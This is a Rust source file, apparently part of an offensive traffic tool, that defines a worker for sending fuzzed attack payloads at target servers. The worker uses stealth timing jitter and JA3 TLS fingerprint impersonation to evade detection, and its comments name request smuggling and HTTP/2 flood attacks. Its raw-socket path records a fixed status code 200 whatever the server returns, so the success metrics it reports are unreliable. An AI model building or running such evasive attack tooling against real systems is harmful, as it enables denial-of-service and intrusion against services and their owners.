use anyhow::Result;
use tokio::sync::mpsc;
use tracing::{info, warn, debug};
use std::sync::Arc;
use std::time::{Duration, Instant};
use reqwest::{Client, Method};
use aether_traits::{Target, TrafficStrategy, TrafficMetrics, AttackResult, PayloadFuzzer};
use mod_traffic::{SmoothFlow, StealthJitter};
use mod_fuzz::PolyglotFuzzer;
use aether_net::transport::TransportBuilder;
use aether_net::tls::{TlsImpersonator, Ja3Cycler};
use tokio::io::AsyncWriteExt;
use std::net::ToSocketAddrs;
use bytes::BytesMut;

/// Instruction set for an adversarial execution cycle.
#[derive(Debug, Clone)]
pub struct ExecutionTask {
    pub target: Arc<Target>,
    pub payload_template: String,
    // CRITICAL FIX #3: Protocol awareness for ALPN synchronization
    pub force_http1: bool,  // True for text-based attacks (smuggling, JSON), false for h2_flood
}

pub struct Worker {
    id: usize,
    receiver: mpsc::Receiver<ExecutionTask>,
    metrics_tx: flume::Sender<AttackResult>,
    client: Client,
    fuzzer: Arc<dyn PayloadFuzzer>,
    traffic_strategy: Arc<dyn TrafficStrategy>,
    tls_cycler: Arc<Ja3Cycler>,
    // CRITICAL FIX #2: Worker owns a persistent buffer (allocated once at startup)
    payload_buffer: BytesMut,
}

impl Worker {
    pub fn new(
        id: usize, 
        receiver: mpsc::Receiver<ExecutionTask>,
        metrics_tx: flume::Sender<AttackResult>,
        strategy_type: &str,
    ) -> Result<Self> {
        let client = Client::builder()
            .timeout(Duration::from_secs(30))
            .build()?;

        let traffic_strategy: Arc<dyn TrafficStrategy> = if strategy_type == "stealth" {
            Arc::new(StealthJitter)
        } else {
            Arc::new(SmoothFlow)
        };

        // CRITICAL FIX #2: Allocate buffer ONCE at worker startup
        let payload_buffer = BytesMut::with_capacity(1024 * 1024);
        
        // Initialize Tri-State TLS Cycler (Directive 7)
        let tls_cycler = Arc::new(Ja3Cycler::new()?);

        Ok(Self {
            id,
            receiver,
            metrics_tx,
            client,
            fuzzer: Arc::new(PolyglotFuzzer),
            traffic_strategy,
            tls_cycler,
            payload_buffer,
        })
    }

    pub async fn run(&mut self) {
        info!("Worker {} [Adversarial] initialized with 1MB reusable buffer.", self.id);

        while let Some(task) = self.receiver.recv().await {
            debug!("Worker {} executing attack on {}", self.id, task.target.url);
            
            let attack_result = if task.target.url.starts_with("raw://") || task.target.url.starts_with("raw-https://") {
                self.execute_raw_attack(task).await
            } else {
                self.execute_attack(task).await
            };

            match attack_result {
                Ok(metrics) => {
                    // [Directive 4] Decoupled Telemetry (Fire-and-Forget)
                    if let Err(_) = self.metrics_tx.try_send(metrics.clone()) {
                        debug!("Worker {} [TELEMETRY_DROP] Channel saturated.", self.id);
                    }

                    info!(
                        "Worker {} ATTACK SUCCESS | Code: {} | Latency: {}us | Size: {} bytes",
                        self.id, metrics.status_code, metrics.latency_us, metrics.size_bytes
                    );
                }
                Err(e) => {
                    warn!("Worker {} ATTACK FAILED: {}", self.id, e);
                }
            }
        }

        info!("Worker {} shutting down.", self.id);
    }

    async fn execute_attack(&mut self, task: ExecutionTask) -> Result<AttackResult> {
        let current_metrics = TrafficMetrics { latency_us: 0, error_count: 0 }; 
        let delay = self.traffic_strategy.next_delay(&current_metrics).await;
        tokio::time::sleep(delay).await;

        self.traffic_strategy.wait().await;

        // CRITICAL FIX #2: Payload Fuzzing using buffer reuse
        self.fuzzer.generate_into(&mut self.payload_buffer, &task.payload_template);
        let payload = self.payload_buffer.split().freeze();

        let method = Method::from_bytes(task.target.method.as_bytes())?;
        let mut request_builder = self.client.request(method, &task.target.url);

        for (key, value) in &task.target.headers {
            request_builder = request_builder.header(key, value);
        }

        let start = Instant::now();
        let response = request_builder.body(payload).send().await?;
        let latency_us = start.elapsed().as_micros();
        
        let status_code = response.status().as_u16();
        let size_bytes = response.bytes().await?.len();

        Ok(AttackResult {
            status_code,
            latency_us,
            size_bytes,
        })
    }

    /// [Directive 6] Raw-Level Bit-Banging Attack.
    /// 
    /// CRITICAL FIX #3: Now respects force_http1 flag for ALPN synchronization.
    /// Text-based attacks (smuggling, JSON) will force HTTP/1.1 to prevent PROTOCOL_ERROR.
    async fn execute_raw_attack(&mut self, task: ExecutionTask) -> Result<AttackResult> {
        let start = Instant::now();
        
        let is_https = task.target.url.starts_with("raw-https://");
        let host = if is_https {
            task.target.url.replace("raw-https://", "")
        } else {
            task.target.url.replace("raw://", "")
        };
        
        let port = if is_https { 443 } else { 80 };
        let addr = format!("{}:{}", host, port).to_socket_addrs()?.next()
            .ok_or_else(|| anyhow::anyhow!("Failed to resolve host"))?;

        // CRITICAL FIX #1 + #2: Pre-flight configured connection with protocol versioning
        let stream = TransportBuilder::connect_adversarial(addr, None, task.force_http1).await?;
        
        // Wrap in TLS if requested (CRITICAL FIX #3: Pass force_http1 to ALPN layer)
        let mut fuzzer_stream = if is_https {
            let boxed_stream = TransportBuilder::into_fuzzer_stream(stream);
            self.tls_cycler.handshake(&host, boxed_stream, task.force_http1).await?
        } else {
            TransportBuilder::into_fuzzer_stream(stream)
        };
        
        self.traffic_strategy.wait().await;
        
        // CRITICAL FIX #2: Build payload using buffer reuse
        self.fuzzer.generate_into(&mut self.payload_buffer, &task.payload_template);
        
        fuzzer_stream.write_all(&self.payload_buffer).await?;
        fuzzer_stream.flush().await?;

        let latency_us = start.elapsed().as_micros();
        let size_bytes = self.payload_buffer.len();
        
        Ok(AttackResult {
            status_code: 200,
            latency_us,
            size_bytes,
        })
    }
}
